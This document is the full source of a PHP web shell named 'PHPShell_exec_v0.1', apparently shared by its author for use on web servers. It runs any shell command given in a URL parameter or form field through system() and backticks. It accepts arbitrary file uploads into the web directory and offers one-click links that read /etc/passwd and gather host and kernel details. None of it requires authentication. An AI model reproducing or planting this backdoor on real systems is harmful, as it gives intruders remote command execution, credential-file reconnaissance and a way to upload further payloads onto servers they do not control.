<html>
<head>
<title>reilzk PHPShell_exec</title>
<style type="text/css">

@charset "UTF-8";
html {
	height: 100%;
}
body {
	background-color: #1c1c1c;
	display: flex;
	flex-direction: column;
	margin: 0;
	height: inherit;
	color: #fafafa;
	font-family: "Armata", sans-serif;
	font-size: 1em;
	font-weight: 400;
	text-align: left;
}
.home {
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	flex: 1 0 auto;
	padding: 0.5em;
}
.home a {
	color: green;
	font-size: 0.9em;
	text-decoration: none;
	cursor: pointer;
}
.home p {
	margin: 0;
	font-size: 1.2em;
	text-align: center;
	text-shadow: 0 0 0.5em #000;
}
.home p:not(:last-child) {
	margin-bottom: 0.5em;
}
.home header {
	text-align: center;
	text-shadow: 0 0 0.5em #000;
}
.home header .title {
	margin: 0;
	font-size: 3.6em;
	font-weight: 400;
}
.home header p {
	margin: 0;
	font-size: 1.7em;
}
.home img {
	margin-bottom: 0.5em;
	height: 14em;
	color: #F8F8F8;
	text-shadow: 0 0 0.5em #000;
	border: 0.07em solid #000;
}
</style>
</head>


<body>
	<div class="home">
	<header>
		<h1 class="title">PHPShell_exec_v0.1</h1>
	</header>
	<p>
		<a href="?">Home</a> &#8226; 
		<a href="?shell">Shell</a> &#8226; 
		<a href="?inject">Upload</a> &#8226; 
		<a href="?cmd=cat /etc/passwd">User Check</a>
		<a href="?cmd=hostnamectl">Machine Hostname Checking</a> &#8226; 
		<a href="?cmd=uname -a">Kernel Checking</a> &#8226;
		<a href="?cmd=php -v">PHP Version</a> &#8226; 
	</p>
	
<?php
if (empty($_REQUEST)) {
	echo '<img src="https://user-images.githubusercontent.com/24449089/97095738-75f32180-168d-11eb-867c-c724d82e7d7b.jpg" alt="Gopay:Andre Reynaldi">';
	echo '<br>';
	echo '<a href="34.87.80.187">Made with love by .//reilzk</a>';
} 

if (!empty($_GET['cmd'])) { 
	echo "<pre>"; system($_GET['cmd']); echo "</pre>"; exit; 
} 
 
if(isset($_GET['inject'])) { 
	if(isset($_POST['filechecking'])) {
		move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
		echo "Inject Succesfully";
	} else {
		echo '<form enctype="multipart/form-data" action="" method="post">
		Nama file : <input type="file" name="file" />
		<br /><input name="filechecking" type="submit" value="Upload"></form>';
 	} 
} 

if(isset($_GET['shell'])) { 
	if(isset($_POST['xxx'])) {
		echo 'wanna change directory? ls -l /home then <br /> <br /><form action="" method="POST">
		<input type="text" name="xxx" value="ls -l">
		<input type="submit" value="Execute">
		</form>';
?>
<pre>
<?= `{$_POST['xxx']};` ?> </pre> <? die(); ?>
<?php 
	} else {
		echo 'wanna change directory? ls -l /home then <br /> <br /><form action="" method="POST">
		<input type="text" name="xxx" value="ls -l">
		<input type="submit" value="Execute">
    	</form>';
 	} 
}
?>
	</div>
</body>
</html>